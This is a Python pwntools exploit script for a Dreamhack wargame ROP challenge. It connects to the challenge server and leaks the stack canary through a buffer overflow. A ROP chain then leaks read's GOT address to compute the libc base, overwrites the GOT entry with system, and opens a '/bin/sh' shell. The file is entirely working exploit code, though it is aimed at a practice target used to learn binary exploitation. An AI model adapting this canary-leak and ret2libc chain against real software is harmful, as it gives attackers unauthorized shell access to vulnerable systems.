# Name: rop.py

from pwn import *

context.arch = 'amd64'
context.os = 'linux'
# context.log_level = 'debug'

def slog(name, addr):
    success(f'{name}: {hex(addr)}')

HOST = 'host3.dreamhack.games'
PORT = 13114

# conn = process('./rop') # local
conn = remote(HOST, PORT)
e = ELF('./rop')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') # local
libc = ELF('./libc.so.6')

conn.sendlineafter(b'Buf: ', b'A' * 0x38)
conn.recvuntil(b'A' * 0x38 + b'\x0a')
canary = u64(b'\x00' + conn.recvn(7))
slog('canary', canary)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
gadget = {
    'ret' : 0x400596,
    'pop rdi; ret' : 0x400853,
    'pop rsi; pop r15; ret' : 0x400851
}

payload = b'A' * 0x38 + p64(canary) + b'B' * 0x8

# write(1, read_got, ...)
payload += p64(gadget['pop rdi; ret']) + p64(0x1)
payload += p64(gadget['pop rsi; pop r15; ret']) + p64(read_got) + p64(0x0)
payload += p64(write_plt)

# read(0, read_got, ...)
payload += p64(gadget['pop rdi; ret']) + p64(0x0)
payload += p64(gadget['pop rsi; pop r15; ret']) + p64(read_got) + p64(0x0)
payload += p64(read_plt)

# read = system 가정
# read("/bin/sh")
payload += p64(gadget['pop rdi; ret']) + p64(read_got + 0x8)
payload += p64(gadget['ret'])
payload += p64(read_plt)

conn.sendafter(b'Buf: ', payload)
read = u64(conn.recvn(6) + b'\x00' * 0x2)
conn.recv()
lb = read - libc.symbols['read']
system = lb + libc.symbols['system']
slog('read', read)
slog('libc_base', lb)
slog('system', system)

conn.send(p64(system) + b'/bin/sh\x00')
conn.interactive()